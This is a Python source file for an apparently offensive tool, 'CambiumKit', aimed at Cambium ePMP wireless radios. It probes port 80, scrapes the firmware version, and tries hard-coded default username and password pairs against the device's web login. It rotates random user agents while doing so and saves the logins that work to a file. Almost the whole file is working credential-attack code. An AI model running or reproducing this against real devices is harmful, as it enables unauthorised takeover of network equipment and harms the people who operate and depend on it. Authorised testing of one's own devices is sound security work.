import requests
import socket
from time import strftime, time
from bs4 import BeautifulSoup
from random import choice

class CambiumKit:
    def __init__(self):
        self.validCreds = {}
        with open("data/useragents.txt", "r") as f:
            self.useragents = [line.replace("\n","") for line in f.readlines()]

    def showMsg(self, *msg):
        """Prints the time before a message"""
        currentTime = strftime("[%H:%M:%S]")
        print(currentTime, " ".join(msg))

    def portOpen(self, host, port):
        """Check if a port is open on host"""
        try:
            so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            so.connect((host, port))
            return True # Port open
        except Exception as error:
            return False # Port closed

    def getCambiumVersion(self, host):
        """Get the ePMP version of 'host'"""
        url = "http://" + host
        headers = {"User-Agent": choice(self.useragents)}
        response = requests.get(url, headers=headers, timeout=10)
        html = BeautifulSoup(response.text, "html.parser")
        try:
            version = html.find(id="sw_version").text
        except Exception as error:
            self.showMsg("Couldn't find Cambium ePMP version", error)
            return None

        return version

    def bruteForce(self, host):
        """Brute Force a single ePMP HTTP login"""
        defaultCreds = [
                ("admin", "admin"),
                ("installer", "installer"),
                ("home", "home"),
                ("readonly", "readonly")
                ]

        headers = {
                "User-Agent": choice(self.useragents) # Random user agent
                }

        url = "http://" + host
        loginUrl = url + "/cgi-bin/luci"
        
        self.showMsg("Starting attack on", host)
        startTime = time()

        session = requests.Session()
        response = session.get(url, headers=headers, timeout=10)
        if response.status_code != 200:
            self.showMsg("Error: target returned non-200 HTTP status code. Skipping...")
            return None
        
        for login in defaultCreds:
            postData = { "username": login[0], "password": login[1] }
            response = session.post(loginUrl, headers=headers, data=postData, timeout=10)
            jsonData = response.json()

            if "auth_failed" in jsonData.values():
                # Failed login
                self.showMsg(f"Login {host} {login[0]}:{login[1]} FAILED")
                continue
            elif "userRole" in jsonData.keys():
                # Check if the creds are admin. Print red if they are.
                if login[0] == "admin":
                    self.showMsg(f"Login {host}\x1b[31m {login[0]}:{login[1]}\x1b[39m \x1b[32mSUCCESS\x1b[39m")
                else:
                    self.showMsg(f"Login {host} {login[0]}:{login[1]}\x1b[32m SUCCESS\x1b[39m")
                if host in self.validCreds.keys():
                    self.validCreds[host].append(":".join(login))
                else:
                    self.validCreds[host] = [":".join(login)]
            else:
                # Unexpected conditions were encountered
                self.showMsg("Error: Couldn't tell if login was valid. Data received:", jsonData)
                continue

        endTime = time()
        totalTime = round(endTime - startTime, 2)
        self.showMsg("Attack time for", f"{host}: {totalTime}s")

    def attackTarget(self, host):
        """Check target version, then attack it with a dictionary attack"""
        if self.portOpen(host, 80) == False:
            self.showMsg(host, "doesn't have port 80 open. Skipping attack...")
            return
        else:
            targetVersion = self.getCambiumVersion(host)
            self.showMsg(host, "ePMP version:", targetVersion)
            self.bruteForce(host)

    def writeCreds(self):
        """Write the found logins to a file"""
        if len(self.validCreds) == 0: # Dont write file if there are no creds
            return
        currentTime = strftime("%Y-%m-%d_%H-%M")
        filename = "cambiumkit_" + currentTime
        with open(filename, "w") as f:
            for ip in self.validCreds.keys():
                allCreds = ",".join(self.validCreds[ip])
                f.write(f"{ip},{allCreds}\n")


